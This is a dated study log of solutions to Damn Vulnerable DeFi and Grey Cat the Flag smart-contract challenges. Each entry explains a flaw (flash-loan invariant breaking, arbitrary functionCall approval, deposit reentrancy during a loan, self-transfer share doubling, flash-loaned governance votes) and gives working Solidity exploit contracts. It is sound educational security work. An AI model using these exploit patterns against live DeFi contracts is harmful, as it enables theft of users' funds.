---
timezone: America/New_York
---


# spark

1. 自我介绍：web3安全攻城狮
2. 你认为你会完成本次残酷学习吗？会

## Notes

<!-- Content_START -->

### 2024.08.29
- Damn Vulnerable DeFi: Unstoppable
- Grey Cat the Flag 2024 Milotruck challs: GreyHats Dollar

#### Unstoppable
Issue:

The main issue lies inside the `flashLoan`:
- For `totalAssets` it will calculate the total token in the contract:
    ```solidity
            return asset.balanceOf(address(this));
    ```
- For `convertToShares` it will do following calculation, which will calculate the total amount for share token
    ```solidity
        supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    ```

If `convertToShares(totalSupply) != totalAssets()` revert then the problem will be solved. But how?

Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.

Solve:
```solidity
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 10);
    }
```



#### GreyHats Dollar
Issue:

The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
```solidity
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public update returns (bool) {
        // ...

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;
        
        // ...

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
```

Solve:
```solidity
    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        setup.ghd().balanceOf(address(this));

        uint256 balance = setup.ghd().balanceOf(address(this));

        setup.ghd().transfer(address(this), balance); //@note gonna double the balance

        
        for (uint i = 0; i <52; i++) {
            setup.ghd().transfer(address(this), balance);
        }

        setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));

    }
```

### 2024.08.30

- Damn Vulnerable DeFi: Truster
- Damn Vulnerable DeFi: SideEntrance

#### Truster
Issue:

The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.

Solve:
```solidity
    function test_truster() public checkSolvedByPlayer {
        test t = new test();

        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            type(uint256).max
        );
        
        pool.flashLoan(0, player, address(pool.token()), approveData);

        pool.token().transferFrom(address(pool), recovery, TOKENS_IN_POOL);

    }
```

#### SideEntrance
Issue: 

The main idea for this program is utilize the the deposit function while flashloan which will manipulate the balance and also fulfill the balance requirement to complete the flashloan.

Solve:

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Exploit exp = new Exploit(address(pool), recovery);
    exp.attack(address(pool).balance);
}

contract Exploit{
    SideEntranceLenderPool pool;

    address recovery;
    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }
    function execute()public payable{
        pool.deposit{value:address(this).balance}();
    }
    function attack(uint256 amount) public payable{
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }
    receive () external payable {}

}
```

### 2024.08.31

- Damn Vulnerable DeFi: Selfie

#### Selfie
Issue:

I feel the biggest issue is that the pool is providing the governance token via flash loan; as long as the token exceeds half of the supply, the proposal can be passed.

```solidity
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
```

Solve:
```solidity
    function test_selfie() public checkSolvedByPlayer {
        SelfiePoolExploit spe = new SelfiePoolExploit(
            pool,
            governance,
            token,
            recovery
        );

        spe.attack();

        vm.warp(block.timestamp + 2 days);
        spe.executeAction();

    }

```

```solidity
contract SelfiePoolExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes votes;
    uint256 public actionId;
    address owner;
    address recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _vote, address _recovery) {
        pool = _pool;
        governance = _governance;
        votes = _vote;
        owner = msg.sender;
        recovery = _recovery;
    }

    function attack() external {
        // init flashloan
        uint256 amount = pool.token().balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), amount, data);
    }

    function onFlashLoan(
        address _initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){

        votes.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        actionId = _actionId;

        IERC20(token).approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        // Execute the malicious auction
        governance.executeAction(actionId);
    }
}
```

<!-- Content_END -->
